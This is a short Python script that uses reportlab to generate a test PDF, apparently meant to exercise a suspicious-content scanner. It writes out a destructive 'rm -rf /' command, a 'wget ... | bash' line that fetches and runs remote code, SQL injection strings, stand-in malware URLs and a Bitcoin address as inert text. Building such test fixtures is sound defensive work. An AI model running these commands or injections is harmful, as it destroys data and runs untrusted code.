from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter

def create_test_pdf():
    # إنشاء ملف PDF
    c = canvas.Canvas("test_suspicious.pdf", pagesize=letter)
    
    # إضافة نص عادي
    c.drawString(100, 750, "هذا ملف PDF اختباري يحتوي على بعض المحتوى المشبوه")
    
    # إضافة روابط مشبوهة
    c.drawString(100, 700, "روابط مشبوهة للاختبار:")
    c.drawString(120, 680, "http://malware.example.com/download")
    c.drawString(120, 660, "https://hack.ru/exploit")
    c.drawString(120, 640, "http://suspicious.cn/virus")
    
    # إضافة أوامر shell مشبوهة
    c.drawString(100, 600, "أوامر shell مشبوهة:")
    c.drawString(120, 580, "rm -rf /")
    c.drawString(120, 560, "wget http://malware.com/script | bash")
    
    # إضافة محاولات SQL injection
    c.drawString(100, 520, "محاولات SQL injection:")
    c.drawString(120, 500, "SELECT * FROM users WHERE 1=1;--")
    c.drawString(120, 480, "UNION SELECT password FROM admin;--")
    
    # إضافة عنوان Bitcoin
    c.drawString(100, 440, "عنوان Bitcoin مشبوه:")
    c.drawString(120, 420, "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")
    
    # حفظ الملف
    c.save()

if __name__ == "__main__":
    create_test_pdf() 